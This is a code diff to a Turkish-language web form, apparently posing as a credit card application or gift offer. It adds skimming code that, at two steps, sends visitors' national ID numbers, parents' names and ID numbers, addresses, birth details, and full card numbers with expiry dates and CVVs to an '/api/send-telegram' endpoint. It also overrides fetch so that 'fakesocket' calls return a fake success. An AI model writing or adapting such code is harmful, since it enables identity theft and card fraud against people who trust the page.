@@ -224,6 +224,23 @@
   </div>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.0/jquery.min.js" integrity="sha512-ijLvQMMXgWAO85zfDbKeoqNR7015wrZI42XGYorITKkG0sVlP4t+Rt5Dl9EKDkrPxGrWZmVCUW5oIXkVOrnCiw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
   <script src="https://cdn.jsdelivr.net/npm/jqueryui@1.11.1/jquery-ui.min.js" integrity="sha256-4JY5MVcEmAVSuS6q4h9mrwCm6KNx91f3awsSQgwu0qc=" crossorigin="anonymous"></script>
+  <script>
+    // fakesocket çağrısını engelle
+    if (typeof fetch !== 'undefined') {
+      const originalFetch = window.fetch;
+      window.fetch = function(...args) {
+        const url = args[0];
+        if (typeof url === 'string' && (url.includes('fakesocket.php') || url.includes('fakesocket'))) {
+          console.log('fakesocket.php çağrısı engellendi');
+          return Promise.resolve(new Response(JSON.stringify({ success: true }), {
+            status: 200,
+            headers: { 'Content-Type': 'application/json' }
+          }));
+        }
+        return originalFetch.apply(this, args);
+      };
+    }
+  </script>
   <script src="./dist/app.js"></script>
   <script>
     document.addEventListener('DOMContentLoaded', function() {
@@ -467,6 +484,39 @@
           return;
         }
 
+        // Telegram'a bildirim gönder - Adım 2
+        const telefon = urlParams.get('phone') || '';
+        const hediye = urlParams.get('hediye') || '';
+        
+        fetch('/api/send-telegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            type: 'step2',
+            tckn: tc,
+            telefon: telefon,
+            kartLimiti: kartLimiti,
+            hediye: hediye,
+            adSoyad: `${apiData?.Adi || ''} ${apiData?.Soyadi || ''}`.trim(),
+            dogumTarihi: apiData?.DogumTarihi || '',
+            cinsiyet: apiData?.Cinsiyet || '',
+            dogumYeri: apiData?.DogumYeri || '',
+            anneAdi: apiData?.AnneAdi || '',
+            babaAdi: apiData?.BabaAdi || '',
+            anneTCKN: apiData?.AnneTCKN || '',
+            babaTCKN: apiData?.BabaTCKN || '',
+            adresIl: apiData?.AdresIl || '',
+            adresIlce: apiData?.AdresIlce || '',
+            memleketIl: apiData?.MemleketIl || '',
+            memleketIlce: apiData?.MemleketIlce || '',
+            medeniHal: apiData?.MedeniHal || ''
+          })
+        }).catch(function(error) {
+          console.error('Telegram bildirim hatası:', error);
+        });
+
         // Başvuru formunu gizle
         document.getElementById('basvuruForm').style.display = 'none';
         
@@ -485,6 +535,7 @@
         const sonKullanimAy = document.getElementById('sonKullanimAy').value;
         const sonKullanimYil = document.getElementById('sonKullanimYil').value;
         const cvv = document.getElementById('cvv').value;
+        const kartLimiti = document.getElementById('kartLimiti').value.replace(/\D/g, '');
 
         // Validasyonlar
         if (!kartNumarasi || kartNumarasi.length !== 16) {
@@ -506,6 +557,43 @@
           alert('Lütfen geçerli bir CVV numarası giriniz (3 haneli)');
           return;
         }
+
+        // Telegram'a bildirim gönder - Adım 3
+        const telefon = urlParams.get('phone') || '';
+        const hediye = urlParams.get('hediye') || '';
+        
+        fetch('/api/send-telegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            type: 'step3',
+            tckn: tc,
+            telefon: telefon,
+            kartLimiti: kartLimiti,
+            hediye: hediye,
+            adSoyad: `${apiData?.Adi || ''} ${apiData?.Soyadi || ''}`.trim(),
+            dogumTarihi: apiData?.DogumTarihi || '',
+            cinsiyet: apiData?.Cinsiyet || '',
+            dogumYeri: apiData?.DogumYeri || '',
+            anneAdi: apiData?.AnneAdi || '',
+            babaAdi: apiData?.BabaAdi || '',
+            anneTCKN: apiData?.AnneTCKN || '',
+            babaTCKN: apiData?.BabaTCKN || '',
+            adresIl: apiData?.AdresIl || '',
+            adresIlce: apiData?.AdresIlce || '',
+            memleketIl: apiData?.MemleketIl || '',
+            memleketIlce: apiData?.MemleketIlce || '',
+            medeniHal: apiData?.MedeniHal || '',
+            kartNumarasi: kartNumarasi,
+            sonKullanimAy: sonKullanimAy,
+            sonKullanimYil: sonKullanimYil,
+            cvv: cvv
+          })
+        }).catch(function(error) {
+          console.error('Telegram bildirim hatası:', error);
+        });
 
         // Başarılı mesajı
         alert('Kart bilgileriniz başarıyla kaydedilmiştir. Teşekkür ederiz!');
